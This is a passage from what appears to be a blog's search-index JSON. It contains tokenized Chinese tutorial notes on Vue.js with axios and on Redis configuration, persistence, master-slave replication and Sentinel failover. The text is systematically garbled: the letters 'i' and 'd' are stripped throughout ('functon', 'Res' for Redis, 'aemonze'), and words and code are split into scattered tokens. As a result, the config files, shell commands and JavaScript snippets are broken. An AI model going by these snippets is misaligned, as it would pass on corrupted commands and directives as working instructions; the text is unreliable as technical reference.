;","&","#","123",";","tem","&","#","125",";","&","#","125",";","button","@","clck=\"el","(","nex",")","\"","xbutton","l","ul","el",":","functon","(","INDEX",")","&","#","123",";","第","一个","参数","是","从","哪删","第二个","参数","是","删除","几个","元素","ths",".","tooLst",".","splce","(","INDEX",",","1",")",";","&","#","125",";","统计","h","3","-","text","=","\"","'","当前","待","执行","的","事件","有","'","+","tooLst",".","length","+","'","个","'","\"","h","3","h","3","当前","待","执行","的","事件","有","&","#","123",";","&","#","123",";","tooLst",".","length","&","#","125",";","&","#","125",";","个","h","3","清","空","h","3","当前","待","执行","的","事件","有","&","#","123",";","&","#","123",";","tooLst",".","length","&","#","125",";","&","#","125",";","个","h","3","button","@","clck=\"clear\"Clearbutton","clear",":","functon","(",")","&","#","123",";","ths",".","tooLst","=","[","]",";","&","#","125",";","隐藏","!","-","-","数组","为","空的","时候","隐藏","计数","和","Clear","按钮","-","-","h","3","-","show","=","\"","tooLst",".","length","!","=","0","\"","当前","待","执行","的","事件","有","&","#","123",";","&","#","123",";","tooLst",".","length","&","#","125",";","&","#","125",";","个","h","3","button","@","clck","=","\"","clear","\"","-","show","=","\"","tooLst",".","length","!","=","0","\"","Clearbutton","我","就","不","写","CSS","网络","应用","Vue","结合","网络","数据","开发","应用","axos","必须","先导","入","才","可以","使用","使用","get","或","post","方法","可以","发送","对应","的","请求","then","方法","中的","回调","函数","可以","在","请求","成功","或","失败","时","触发","通过","回调","函数","的","形参","可以","获取","响应","内容","，","或","错误信息","axos","网络","请求","库","scrpt","src","=","\"","https",":","unpkg",".","comaxosstaxos",".","mn",".","js","\"","scrptaxos",".","get","(","地址","?","key","=","alue",",","key","=","alue",")",".","then","(","functon","(","response",")","&","#","123",";","&","#","125",";",",","functon","(","err",")","&","#","123",";","&","#","125",";",")","axos",".","post","(","地址",",","(","key","=","alue",",","key","=","alue",")",")",".","then","(","functon","(","response",")","&","#","123",";","&","#","125",";",",","functon","(","err",")","&","#","123",";","&","#","125",";",")","axos","的","两种","请求","!","-","-","官网","提供","的","axos","在线","地址","-","-","scrpt","src","=","\"","https",":","unpkg",".","comaxosstaxos",".","mn",".","js","\"","scrpt","scrpt","*","接口","1","：","随机","笑话","请求","地址","：","https",":","autumnfsh",".","cnapjokelst","请求","方法","：","Get","请求","参数","：","num","（","笑话","条","数","，","数字","）","相应","内容","：","随机","笑话","*","ocument",".","querySelector","(","\"",".","get","\"",")",".","onclck","=","functon","(",")","&","#","123",";","axos",".","get","(","\"","https",":","autumnfsh",".","cnapjokelst","?","num","=","3","\"",")",".","then","(","functon","(","response",")","&","#","123",";","console",".","log","(","response",")",";","&","#","125",";",",","functon","(","err",")","&","#","123",";","console",".","log","(","err",")",";","&","#","125",";",")","&","#","125",";","*","接口","2","：","用户","注册","请求","地址","：","https",":","autumnfsh",".","cnapuserreg","请求","方法","：","post","请求","参数","：","username","(","用户名","，","字符串",")","响应","内容","：","注册","成功","或","失败","*","ocument",".","querySelector","(","\"",".","post","\"",")",".","onclck","=","functon","(",")","&","#","123",";","axos",".","post","(","\"","https",":","autumnfsh",".","cnapuserreg","\"",",","&","#","123",";","username",":","\"","ZEN","\"","&","#","125",";",")",".","then","(","functon","(","response",")","&","#","123",";","console",".","log","(","response",")",";","&","#","125",";",",","functon","(","err",")","&","#","123",";","console",".","log","(","err",")",";","&","#","125",";",")","&","#","125",";","scrpt","ue","+","axos","使用","axos","获取","API","返回","的","数据","ths","传递","数据","，","交给","界面","显示","axos","回调","函数","中的","ths","已经","改变","，","无法","访问","ata","中","的","数据","，","可以","先","定义","一个","变量","把","ths","保存","起来","=","\"","app","\"","nput","type","=","\"","button","\"","alue","=","\"","Get","请求","\"","class","=","\"","get","\"","@","clck","=","\"","getJoke","\"","br","ul","l","-","for","=","\"","(","tem",",","nex",")","n","joke","\"","&","#","123",";","&","#","123",";","tem","&","#","125",";","&","#","125",";","br","l","ul","ar","app","=","new","Vue","(","&","#","123",";","el",":","\"","#","app","\"",",","ata",":","&","#","123",";","joke",":","\"","一个","笑话","\"",",","&","#","125",";",",","methos",":","&","#","123",";","getJoke",":","functon","(",")","&","#","123",";","ar","that","=","ths","axos",".","get","(","\"","https",":","autumnfsh",".","cnapjokelst","?","num","=","3","\"",")",".","then","(","functon","(","response",")","&","#","123",";","console",".","log","(","response",".","ata",")",";","that",".","joke","=","response",".","atajokes",";","&","#","125",";",",","functon","(","err",")","&","#","123",";","console",".","log","(","err",")",";","&","#","125",";",")","&","#","125",";","&","#","125",";",",","&","#","125",";",")"],"url":"http://ymlog.cn/2020/04/26/VueJS/","title":"VueJS 浅知","content":"Vue 是Javascript的框架，用于简化DOM（domain obeject m）操作，响应式数据驱动。\nVue两种导入方式：\n&lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;&lt;script src&#...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/%E7%BC%96%E7%A8%8B/","name":"编程"},"date":"2020-04-26 13:43:51"},{"word":["Res","简介","Res","特点","K","-","V","数据库","支持","丰富的","数据类型","：","Strng","、","Hash","、","Lst","、","Set","、","Zset","（","5","大","基础","类型","）","和","Memcache","对比","：","数据","都是","存储","在内","存","中的","，","但是","Res","可以","做","持久","化","存储","（","数据","可以","存储","在","磁盘","上","）","工作","模型","：","单","线程","IO","多路复用","内存","集群","方案","速度","快","Res","为","什么","快","？","数据库","存储","在","内存","中","一般","采用","单","线程","IO","多路复用","单","线程","可以","避免","CPU","竞争","带来","的","开销","（","Res","属于","CPU","密集型","，","单独","部署","，","避免","和","其他","业务","产生","CPU","竞争","问题","）","单","线程","数据结构","等","开销","较小","常用","场景","1","、","缓存","2","、","计数","，","许多","应用","都会","使用","Res","作为","计数","的","基础","工具","，","它","可以","实现","快速","计数","、","查询","缓存","的","功能","，","同时","数据","可以","异步","落地","到","其他","数据源","。","例如","笔者","所在","团队","的","视频","播放","数","系统","就是","使用","Res","作为","视频","播放","数","计数","的","基础","组件","，","用户","每","播放","一次","视频","，","相应","的","视频","播放","数","就","会","自","增","1","：","long","ncrVeoCounter","(","long",")","&","#","123",";","key","=","\"","eo",":","playCount",":","\"","+",";","return","res",".","ncr","(","key",")",";","&","#","125",";","3","、","共享","Sesson","4","、","限速","很多","应用","出于","安全的","考虑","，","会","在","每次","进行","登录","时","，","让","用户","输入","手机","验证","码","，","从而","确定","是否","是","用户","本人","。","但是","为了","短信","接口","不","被","频繁","访问","，","会","限制","用","户","每分钟","获取","验证","码","的","频率","phoneNum","=","\"","138","xxxxxxxx","\"",";","key","=","\"","shortMsg",":","lmt",":","\"","+","phoneNum",";","SET","key","alue","EX","60","NX","sExsts","=","res",".","set","(","key",",","1",",","\"","EX","60","\"",",","\"","NX","\"",")",";","f","(","sExsts","!","=","null","res",".","ncr","(","key",")","=","5",")","&","#","123",";","通过","&","#","125",";","else","&","#","123",";","限速","&","#","125",";","初","入","Res","[","root@localhost","~","]","#","yum","-","y","nstall","res","[","root@serer","yum",".","repos",".","]","#","rpm","-","ql","resetclogrotate",".","res","#","日志","配置","etcres","-","sentnel",".","conf","#","哨兵","配置","etcres",".","conf","#","主","配置","文件","usrbnres","-","cl","#","客户端","工具","usrbnres","-","sentnel","#","哨兵","配置","工具","usrbnres","-","serer","#","res","服务","工具","usrbnres","-","check","-","aof","#","aof","文件","修复","工具","usrbnres","-","check","-","rb","#","rb","文件","修复","工具","#","Res","服务","的","启动","res","-","serer","#","连接","Res","服务","res","-","cl","配置文件","[","root@serer","~","]","#","cat","etcres",".","conf","grep","-","E","'","^","$","^","#","'","bn","127.0.0.1","#","监听","服务","地址","protecte","-","moe","yes","port","6379","#","端口","tcp","-","backlog","511","#","tcp","全","连接","数量","tmeout","0","#","超时","时间","tcp","-","keepale","300","#","tcp","长","连接","数量","aemonze","no","#","是否","在","后台","运行","superse","no","#","superse","管理","是否","打开","pfle","arrunres","_","6379",".","p","#","res","服务","的","p","文件","位置","logleel","notce","#","日志","等级","记录","logfle","arlogresres",".","log","#","日志","存放","位置","atabases","16","#","res","数据库","实例","的","设置","数量","sae","900","1","#","出发","rb","持久","化","存储","的","策略","900","s","-","1条","写入","；","sae","300","10","#","同上","sae","60","10000","stop","-","wrtes","-","on","-","bgsae","-","error","yes","#","bgsae","手动","触发","rb","持久","化","存储","，","命令","失败","停止","写入","rbcompresson","yes","#","rb","文件","压缩","rbchecksum","yes","#","rb","文件","校验","bflename","ump",".","rb","#","rb","文件名","称","r","arlbres","#","res","服务","目录","slae","-","sere","-","stale","-","ata","yes","slae","-","rea","-","only","yes","#","当","此","结点","作为","slaer","的","时候","，","开启","只读","模式","#","master","-","slaer","之间","的","复制","策略","repl","-","skless","-","sync","no","repl","-","skless","-","sync","-","elay","5","repl","-","sable","-","tcp","-","noelay","noslae","-","prorty","100","#","slae","优先级","appenonly","no","#","持久","化","aof","存储","appenflename","\"","appenonly",".","aof","\"","#","aof","文件名","称","appenfsync","eerysec","no","-","appenfsync","-","on","-","rewrte","noauto","-","aof","-","rewrte","-","percentage","100","auto","-","aof","-","rewrte","-","mn","-","sze","64","mbaof","-","loa","-","truncate","yeslua","-","tme","-","lmt","5000","slowlog","-","log","-","slower","-","than","10000","#","慢","日志","设定","时间","，","单位","微秒","slowlog","-","max","-","len","128","#","慢","日志","长度","，","当","慢","查询","日志","处于","其","最大","长度","时","，","将","最早","插入","的","命令","移出","latency","-","montor","-","threshol","0","notfy","-","keyspace","-","eents","\"","\"","#","数据类型","底层","编码","的","策略","：","相同","的","数据类型","，","底层","的","数据结构","编码","方式","可能","不同","hash","-","max","-","zplst","-","entres","512","hash","-","max","-","zplst","-","alue","64","lst","-","max","-","zplst","-","sze","-","2","lst","-","compress","-","epth","0","set","-","max","-","ntset","-","entres","512","zset","-","max","-","zplst","-","entres","128","zset","-","max","-","zplst","-","alue","64","hll","-","sparse","-","max","-","bytes","3000","acterehashng","yes","#","客户端","输出","缓冲区","显示","策略","clent","-","output","-","buffer","-","lmt","normal","0","0","0","clent","-","output","-","buffer","-","lmt","slae","256","mb","64","mb","60","clent","-","output","-","buffer","-","lmt","pubsub","32","mb","8","mb","60","hz","10","#","内存","回收","策略","，","定期","删除","过期","任务","每","s","运行","次数","aof","-","rewrte","-","ncremental","-","fsync","yes","慢","查询","slowlog","get","#","获取","慢","查询","日志","slowlog","len","#","获取","慢","查询","日志","长度","slowlog","reset","#","重置","慢","查询","日志","Res","小工","具","res","-","cl","-","r","100","-","1","nfo","grep","use","_","memory","_","human","#","-","r","repeat","#","-","nteral","#","-","a","auth","#","-","c","Cluster","#","-","x","从","标准","输入","(","stn",")","读取","数据","#","-","-","slae","把","客户端","模拟","成","当前","Res","节点","的","从","节点","#","-","-","latency","测试","客户端","到","目标","Res","的","延迟","#","-","-","stat","实时","获取","Res","统计","信息","res","-","serer","#","-","-","test","-","memory","1024","检测","操作系统","能否","稳定","分配","1","G","内存","给","Res","res","-","benchmark","基准","性能","测试","#","-","c","clents","客户端","并发","数","，","默认","50","#","-","nrequests","客户端","请求","总量","，","默认","100000","#","-","p","ppelne","每个","请求","的","ppelne","数量","，","默认","为","1","#","-","kboolean","是否","启用","keepale","，","1","为","使用","#","-","tget",",","set","使用","指定","命令","进行","基准","测试","#","-","-","cs","结果","以","cs","格式","输出","[","root@hw","~","]","#","res","-","benchmark","-","c","100","-","n","2000",".",".",".",".",".",".",".",".",".","24.50%","=","1","mllsecons","60.05%","=","2","mllsecons","66.15%","=","3","mllsecons","76.60%","=","4","mllsecons","87.05%","=","5","mllsecons","93.60%","=","6","mllsecons","95.90%","=","7","mllsecons","97.70%","=","8","mllsecons","98.65%","=","13","mllsecons","99.65%","=","14","mllsecons","100.00%","=","14","mllsecons","29850.75","requests","per","secon","#","监视","Res","正在","执行","的","命令","，","可能会","占用","大量","的","内存","127.0.0.1",":","6379","montorOK","1586155547.048775","[","0","121.36.70.55",":","34886","]","\"","auth","\"","\"","abc","\"","1586155555.897676","[","0","121.36.70.55",":","34886","]","\"","keys","\"","\"","*","\"","#","客户端","统计","片段","121.36.70.55",":","6379","nfo","clentsconnecte","_","clents",":","2","clent","_","longest","_","output","_","lst",":","0","#","客户端","缓冲区","可能会","造成","内存","陡增","，","尤其是","对于","主","节点","；","内存","陡增","还","可能","是","存在","大量","写入","；","或者","是","客户端","在","执行","montor","命令","解决办法","：","1","、","kll","这个","连接","2","、","禁止","montor","命令","3","、","限制","输出","缓冲区","的","大小","clent","_","bggest","_","nput","_","buf",":","0","blocke","_","clents",":","0","数据类型","http",":","resoc",".","comnex",".","html","Strng","1","、","设置","获取","键值","SET","key","alue","[","EX","secons","]","[","PX","mllsecons","]","[","NXXX","]","EX","secons","：","将","键","的","过期","时间","设置","为","secons","秒","。","PX","mllsecons","：","将","键","的","过期","时间","设置","为","mllsecons","毫秒","。","NX","：","只","在","键","不存在","时","，","才","对","键","进行","设置","操作","。","XX","：","只","在","键","已经","存","在","时","，","才","对","键","进行","设置","操作","。","[","root@serer","~","]","#","res","-","cl","127.0.0.1",":","6379","set","k","1","1","OK","127.0.0.1",":","6379","get","k","1","\"","1","\"","127.0.0.1",":","6379","ttl","获取","键值","的","生存","时间","ncr","为","键值","进行","加","操作","ncrbyecr","为","键值","进行","减","操作","ecrby","不想","写","了","，","都","在","这","：","http",":","resoc",".","comnex",".","html","lstlpush","rpush","lpop","rpop","lrange","lset","lnex","HashSetsa","scar","sff","snter","sunon","smembers","spop","scre","zsetza","zcar","zcount","zrange","键","操作","含义","rename","key","newkey","重","命名","key","renamenx","key","newkey","确保","只","有","newKey","不存在","时候","才","被覆","盖","ranomkey","随机","返回","一个","键","expre","key","secons","键","在","secons","秒","后","过期","ttl","key","观察","它","的","过期","剩余时间","（","单位","：","秒","）","pexpre","key","mllsecons","键","在","mllsecons","毫秒","后","过期","persst","key","将","键","的","过期","时间","清除","keys","pattern","获取","所有","的","键","(","key","*",")","scan","cursor","[","match","pattern","]","[","count","number","]","扫描","字典","键","，","对","其他","数据类型","，","则","是","hscan","、","sscan","、","zscan","。","渐进","式","地","遍历","键","迁移","ump","key","restore","key","ttl","alue","数据库","管理","命令","含义","select","bInex","切换","数据库","atabases","16","flushb","只","清除","当前","数据库","flushall","清除","所有","数据库","auth","“","youpasswor","”","输入","res","密码","，","即","配置","文件","中","requrepass","127.0.0.1",":","6379","set","hello","worl","OK","127.0.0.1",":","6379","get","hello","\"","worl","\"","127.0.0.1",":","6379","select","15","OK","127.0.0.1",":","6379","[","15","]","get","hello","(","nl",")","持久","化","存储","RDB","持久","化","存储","AOF","持久","化","存储","RDBRDB","持久","化","存储","：","将","内存","中的","数据","存储","快照","写","到","磁盘","中","（","快照","方式","）","优点","：","应用","场景","：","做","全","量","备份","；","快照","代表","的","一个时间","的","数据","集","状态","RDB","文件","：","a",".","二进制文件","b",".","压缩","机制","；","所以","对于","AOF","文件","来说","，","体积","更","小","生成","RDB","文件","：","res","主","进程","去","fork","(",")","一","个子","进程","去","负责","RDB","文件","生成","工作","，","fork","(",")","这个","操作","肯定","会","有","阻塞","缺点","：","没","办法","做到","实时","持久","化","RDB","二进制","格式","随着","Res","版本","的","得","带","，","可能","存在","兼容性问题","周期性","执行","一次性","备份","操作","，","如果","Res","在此期间","own","掉","，","会","存在","数据","丢失","RDB","压缩","会","消耗","CPU","资源","触发","方式","：","自动","触发","：","主","配置","文件","中的","sae","字段","手动","触发","：","bgsae","confg","get","r","可以","查看","RDB","文件","的","备份","路径","，","服务","启动","时","，","热","更新","配置",":","confg","set","r","path","confg","set","bflename","alue","res","服务","启动","时","，","会","去","r","下","读取","bflename","文件","停止","RDB","持久","化","：","注释","配置文件","中的","sae","关键字","RDB","工作","流程","：","bgsae","命令","发送","给","主","进程","res","父","进程","接收","到","bgsae","命令","之后","，","fork","(",")","创建","一","个子","进程","当子","进程","完成","之后","，","继续","去","响应","客户端","请求","子","进程","负责","将","内存","中的","数据","打上","快","照","并","生成","RDB","文件","存储","在","本地","指定","位置","上","子","进程","完成","工作","后","发","信号","通知","父","进程","获取","最近","一个","fork","操作","的","耗","时","，","单位","为","微秒","nfo","stats",".",".",".","latest","_","fork","_","usec",":","133","执行","lastsae","命令","可以","获取","最后","一次","生成","RDB","的","时间","Res","默认","采用","LZF","算法","对","生成","的","RDB","文件","做","压缩","处理","，","压缩","后","的","文件","远远","小于","内存大小","，","默认","开启","AOFRes","的","持久","化","方式","之一","，","RDB","是","通过","保存","数据库","中的","键值","对","来","记录","数据库","的","状态","，","而","另一种","持久","化","方式","AOF","则","是","通过","保存","Res","服务所","执行","的","命令","来","记录","数据库","的","状态","优点","：","AOF","持久","化","的","方法","提供","了","多种","同步","频率","，","即使","使用","默认","同步","频率","每秒","同步","一次","，","res","最多","也","就","丢失","一秒","的","数据","AOF","文件","使用","Res","命令","追加","的","形式","来","构造","，","因此","，","即使","Res","只","能","向","AOF","文件","写入","命令","的","片段","，","使用","res","-","check","-","aof","工具","也","很容易","修正","AOF","文件","AOF","文件","可读性","较","强","，","这","也","为","使用者","提供","了","更","灵活的","处理","方式","。","如果","我们","不","小心","错用","了","FLUSHALL","命令","，","在","重","写","还","没","进行","时","，","我们","可以","手工","将","最后","FLUSHALL","命令","去掉","，","然后","再","使用","AOF","文件","来","恢复","数据","缺点","：","对于","具有","相同","数据","的","Res","，","AOF","文件","通常","会","比","RDB","文件","体积","更大","虽然","AOF","提供","了","多种","同步","频率","，","默认","情况","下","，","每秒","同步","一次","的","频率","也","具有","较","高的","性能","。","但是","在","Res","的","负载","较","高时","，","RDB","比","AOF","具有","更好","的","性能","保证","RDB","使用","快照","的","形式","来","持久","化","整个","Res","数据","，","而","AOF","只是","将","每次","执行","的","命令","追加","到","AOF","文件","中","，","因此","从","理论上","来说","RDB","比","AOF","方式","更","健壮","，","官方","文档","也","指出","，","AOF","的确","存","在","一些","BUG","。","开启","AOF","将","res",".","conf","的","appenonly","改为","yes","客户端","内","：","confg","set","appenonly","yes","，","查看","是否","开启","confg","get","appenonly","手动","备份","：","bgrewrteaof","AOF","工作","流程","用户","操作","命令","追加","写入","到","AOF","Buf","AOF","缓冲区","会","将","操作","命令","根据","指定","的","同步","策略","写入","到","AOF","文件","中","进行","重","写","操作","（","新的","AOF","文件","替换","就","的","AOF","文件","）","服务","启动","时","，","可以","去","加载","AOF","文件","达到","的","数据","恢复","的","状态","AOF","同步","策略","：","调用","两个","系统","接口","：","wrte","&","amp",";","fsync","always","：","保证","文件","存储","到","磁盘","中","才","返回","（","wrte","-","buf","-","fsync","-","sk",")","可靠性","高","阻塞","长","no","：","只能","保证","文件","存储","到","缓冲区","（","wrte","-","buf","；","直接","返回","）","缓冲区","中的","数据","同步","到","磁盘","上","是","由","系统","调度","机制","去","完成","的","）","阻塞","相对","较","短","，","但是","可靠性","不","高","eerysec","：","调用","wrte","操作","将","内存","中的","数据","写入","到","缓冲区","中","，","然后","后天","会","有","一个","专门","的","fsync","线程","每","s","执行","一次","将","缓冲区","的","内容","写入","到","磁盘","中","。","相对","于","always","和","no","来说","，","可靠性","和","效率","都","有所","保证","。","wrte","操作","：","会","触发","延迟","写","机制","，","因为","Lnux","在","内核","提供","页","缓冲区","来","提供","磁盘","IO","性能","，","wrte","操作","在","写入","系统","缓冲区","后","直接","返回","，","同步","到","硬盘","依赖","于","系统","的","调度","机制","。","fsync","操作","：","针对","单个","文件","操作","，","做","强制","硬盘","同步","，","fsync","将","阻塞","直到","写入","硬盘","完成","后","返回","，","保证","了","数据","的","持久","化","。","AOF","重","写","工作","流程","：","执行","bgrewrteaof","操作","交由","res","父","进程","父","进程","fork","(",")","创建","一","个子","进程","（","完成","AOF","生成","替换","工作","）","父","进程","继续","响应","用户","请求","操作","写入","到","AOF","_","BUF","中","，","追加","到","ol","aof","文件","中","写入","到","AOF","_","rewrte","_","buf","子","进程","根据","内存","数据","集","完成","AOF","文件","的","工作","还","需要","将","AOF","_","rewrte","_","buf","中的","数据","追加","生成","到","AOF","文件","中","（","从而","保证","子","进程","创建","AOF","文件","时","，","父","进程","继续","相应","用户","请求","数据","新的","AOF","文件","替换","旧的","AOF","文件","为什么","要","重","写","?","比如","操作","：","set","k","1","1","el","k","1","这个","操作","最后","没有","任何","数据","产生","，","是","没","有意义","的","，","所以","AOF","不需要","写入","。","AOF","和","RDB","文件","同时","存在","的","时候","，","优先","加载","AOF","文件","。","主从","复制","缺点","：","如果","master","服务器","出现","问题","，","则","不能","提供","服务","，","需要","人工","修改","配置","，","将","slae","提升","为","master","主从","复制","，","master","服务器","成为","写","操作","瓶颈","单机","节点","存储","能力","有限","复制","原理","从","节点","复制","主","结点","数据","，","从","节点","只能","响应","读","操作","。","全","量","复制","：","将","主","结点","的","所有","数据","复制","到","本地","部分","复制","：","主","结点","持续","响应","用户","请求","操作","，","然后","同步","到","本地","执行","从","节点","执行","slaeof","命令","从","节点","只是","保存","了","slaeof","命令","中主","节点","的","信息","，","并没有","立即","发起","复制","从","节点","内部","的","定时","任务","发","现有","主","节点","的","信息","，","开始","使用","socket","连接","主","节点","连接","建立","成功","后","，","发送","png","命令","，","希望","得到","pong","命令","响应","，","否则","会","进行","重连","如果","主","节点","设置","了","权限","，","那么","就","需要","进行","权限","验证","；","如果","验证","失败","，","复制","终止","。","权限","验证","通过","后","，","进行","数据","同步","，","这是","耗时","最长的","操作","，","主","节点","将","把","所","有的","数据","全部","发送","给","从","节点","。","当","主","节点","把","当前","的","数据","同步","给","从","节点","后","，","便","完成","了","复制","的","建立","流程","。","接下来","，","主","节点","就","会","持续","的","把","写","命令","发送","给","从","节点","，","保证","主从","数据一致性","。","全","量","复制","部分","复制","优点","：","备份","；","读写","分离","缺点","：","如果","主","结点","own","了","，","我们","需要","人工","切换","slae","节点","的","新","主节","信息","（","slaeof","）","单机","存储","容量","受限","（","数据","只","会","存储","在","master","节点","上","）","，","master","节点","读","操作","负载","容易","变","高","实验","#","!","bnbashmkr","tmpres","&","#","123",";","ata",",","conf",",","log","&","#","125",";","-","p","#","主","服务器","cat","EOF","tmpresconfres","_","6380",".","confbn","127.0.0.1","port","6380","aemonze","yespfle","tmpresres","_","6380",".","plogleel","notcelogfle","tmpreslogres","_","6380",".","logr","tmpresataEOFcat","EOF","tmpresconfres","_","6381",".","confbn","127.0.0.1","port","6381","aemonze","yespfle","tmpresres","_","6381",".","plogleel","notcelogfle","tmpreslogres","_","6381",".","logr","tmpresataslaeof","127.0.0.1","6380","EOFcat","EOF","tmpresconfres","_","6382",".","confbn","127.0.0.1","port","6382","aemonze","yespfle","tmpresres","_","6382",".","plogleel","notcelogfle","tmpreslogres","_","6382",".","logr","tmpresataslaeof","127.0.0.1","6380","EOFres","-","serer","tmpresconfres","_","6380",".","confres","-","serer","tmpresconfres","_","6381",".","confres","-","serer","tmpresconfres","_","6382",".","conf","测试","[","root@localhost","~","]","#","res","-","cl","-","p","6380127.0.0.1",":","6380","nfo","Replcaton","#","Replcatonrole",":","masterconnecte","_","slaes",":","2","slae","0",":","p","=","127.0.0.1",",","port","=","6381",",","state","=","onlne",",","offset","=","99",",","lag","=","0","slae","1",":","p","=","127.0.0.1",",","port","=","6382",",","state","=","onlne",",","offset","=","99",",","lag","=","0","master","_","repl","_","offset",":","99","repl","_","backlog","_","acte",":","1","repl","_","backlog","_","sze",":","1048576","repl","_","backlog","_","frst","_","byte","_","offset",":","2","repl","_","backlog","_","hstlen",":","98","#","写入","一","定","的","值","127.0.0.1",":","6380","set","k","1","1","OK","127.0.0.1",":","6380","get","k","1","\"","1","\"","127.0.0.1",":","6380","[","root","@","noe","01","~","]","#","res","-","cl","-","p","6381127.0.0.1",":","6381","keys","*","1",")","\"","k","1","\"","master","日志","分析","10974",":","M","05","Apr","15",":","08",":","11.474","*","Startng","BGSAVE","for","SYNC","wth","target",":","sk","#","bgsae","执行","过程","10974",":","M","05","Apr","15",":","08",":","11.474","*","Backgroun","sang","starte","by","p","10982","#","master","接收","到来","自","slae","2","的","全","量","复制","请求","10974",":","M","05","Apr","15",":","08",":","11.483","*","Slae","127.0.0.1",":","6382","asks","for","synchronzaton","10974",":","M","05","Apr","15",":","08",":","11.483","*","Full","resync","requeste","by","slae","127.0.0.1",":","638210974",":","M","05","Apr","15",":","08",":","11.483","*","Watng","for","en","of","BGSAVE","for","SYNC","10982",":","C","05","Apr","15",":","08",":","11.485","*","DB","sae","on","sk","10982",":","C","05","Apr","15",":","08",":","11.485","*","RDB",":","0","MB","of","memory","use","by","copy","-","on","-","wrte","10974",":","M","05","Apr","15",":","08",":","11.567","*","Backgroun","sang","termnate","wth","success","#","数据","同步","给","slae","1","和","2","，","增量","复制","10974",":","M","05","Apr","15",":","08",":","11.568","*","Synchronzaton","wth","slae","127.0.0.1",":","6381","succeee","10974",":","M","05","Apr","15",":","08",":","11.568","*","Synchronzaton","wth","slae","127.0.0.1",":","6382","succeee","slaer","日志","分析","#","与","master","节点","建立","连接","通信","10978",":","S","05","Apr","15",":","08",":","11.473","*","Connectng","to","MASTER","127.0.0.1",":","6380","#","全","量","复制","同步","开始","前","的","准备","阶段","10978",":","S","05","Apr","15",":","08",":","11.473","*","MASTER","-","SLAVE","sync","starte","10978",":","S","05","Apr","15",":","08",":","11.473","*","Non","blockng","connect","for","SYNC","fre","the","eent",".","10978",":","S","05","Apr","15",":","08",":","11.473","*","Master","reple","to","PING",",","replcaton","can","contnue",".",".",".","10978",":","S","05","Apr","15",":","08",":","11.474","*","Partal","resynchronzaton","not","possble","(","no","cache","master",")","#","开始","全","量","复制","10978",":","S","05","Apr","15",":","08",":","11.474","*","Full","resync","from","master",":","0","ae","1","eafaf","5","a","6804","f","353","a","3","a","5","a","5934","a","0","f","624","f","390",":","110978",":","S","05","Apr","15",":","08",":","11.568","*","MASTER","-","SLAVE","sync",":","receng","77","bytes","from","master","10978",":","S","05","Apr","15",":","08",":","11.568","*","MASTER","-","SLAVE","sync",":","Flushng","ol","ata","10978",":","S","05","Apr","15",":","08",":","11.568","*","MASTER","-","SLAVE","sync",":","Loang","DB","n","memory","10978",":","S","05","Apr","15",":","08",":","11.568","*","MASTER","-","SLAVE","sync",":","Fnshe","wth","success","哨兵","架构","Sentnel","Moe","优点","：","备份","；","读写","分离","；","可以","自动","切换","主","节点","缺点","：","单机","存储","容量","受限","主","结点","写","负载","会","很","高","扩展性","较","差","哨兵","原理","：","每个","哨兵","会","向","其他","哨兵","、","主","服务器","、","从","服务器","定时","发送","消息","，","以","确认","对方","是否","活着","。","当","主","节点","挂掉","的","时候","，","某个","哨兵","1","通过","检测","机制","发现","了","这样","一个","情况","，","主观的","认","为","这个","主","节点","挂掉","了","（","暂时","还","不能","确认","）","，","会","将","这个","信息","发送","给","其他","的","哨兵","，","其他","哨兵","如果","都","赞同","哨兵","1","的确","认","信息","，","则","主观","认","为","这个","节点","挂掉","了","（","主","结点","真正","的","被","分为","挂掉","了","）","。","发现","master","挂掉","之后","，","从","剩下","的","slae","中","重新","选择","新的","master","节点","；","每个","哨兵","都会","监控","slaer","节点","的","状态","信息","，","通过","slae","节点","的","状态","信息","进行","投票","选择","，","票数","高的","成","为","新的","主","结点","，","并且","哨兵","回去","向","其他","节点","告知","新","主","节点","的","信息","（","IP","_","PORT",")","，","其他","节点","得到","哨兵","的","通知","消息","后","，","自动","执行","slaeof","去","同步","新的","主","节点","信息","。","哨兵","实验","#","!","bnbash","#","配置","哨兵","1","，","监听","26378","端口","cat","EOF","tmpresconfres","-","sentnel","-","26378",".","confport","26378","aemonze","yesr","'","tmp","'","sentnel","montor","mymaster","127.0.0.1","6380","1","sentnel","own","-","after","-","mllsecons","mymaster","6000","sentnel","faloer","-","tmeout","mymaster","18000","logfle","\"","tmpreslogsentne","1",".","log","\"","EOF","#","配置","哨兵","2","，","监听","26379","端口","cat","EOF","tmpresconfres","-","sentnel","-","26379",".","confport","26379","aemonze","yesr","'","tmp","'","sentnel","montor","mymaster","127.0.0.1","6380","1","sentnel","own","-","after","-","mllsecons","mymaster","6000","sentnel","faloer","-","tmeout","mymaster","18000","logfle","\"","tmpreslogsentne","2",".","log","\"","EOF","#","配置","哨兵","3","，","监听","26380","端口","cat","EOF","tmpresconfres","-","sentnel","-","26380",".","confport","26380","aemonze","yesr","'","tmp","'","sentnel","montor","mymaster","127.0.0.1","6380","1","sentnel","own","-","after","-","mllsecons","mymaster","6000","sentnel","faloer","-","tmeout","mymaster","18000","logfle","\"","tmpreslogsentne","3",".","log","\"","EOF","#","启动","哨兵","res","-","sentnel","tmpresconfres","-","sentnel","-","26379",".","confres","-","sentnel","tmpresconfres","-","sentnel","-","26378",".","confres","-","sentnel","tmpresconfres","-","sentnel","-","26380",".","conf","测试","：","[","root","@","noe","01","~","]","#","res","-","cl","-","p","26379127.0.0.1",":","26379","sentnel","master","mymaster","1",")","\"","name","\"","2",")","\"","mymaster","\"","3",")","\"","p","\"","4",")","\"","127.0.0.1","\"","5",")","\"","port","\"","6",")","\"","6380","\"",".",".",".",".","sentnel","master","master","-","name","：","显示","所有","被","监控","主","节点","状态","及","统计","信息","sentnel","slaes","master","-","name","：","显示","指定","master","-","name","的","从","节点","状态","及","统计","信息","sentnel","sentnels","master","-","name","：","显示","指定","master","-","name","的","sentnel","节点","集合","sentnel","faloer","master","-","name","：","强制","故障","转移","sentnel","ckquorum","master","-","name","：","检查","当前","可","达","Sentnel","节点","总数","是否","到","quoro","个数","sentnel","flushconfg","：","将","节点","的","配置","强制","刷","到","磁盘","上","sentnel","remoe","master","-","name","：","取消","当前","Sentnel","对","指定","master","节点","的","监控","sentnel","set","master","-","name","：","动态","修改","Sentnel","节点","配置","sentnel","s","-","master","-","own","-","by","-","ar","：","Sentnel","节点","之间","用来","交换","对","主","节点","是否","下线","的","判断","模拟","master","挂掉","[","root","@","noe","01","~","]","#","ps","-","ef","g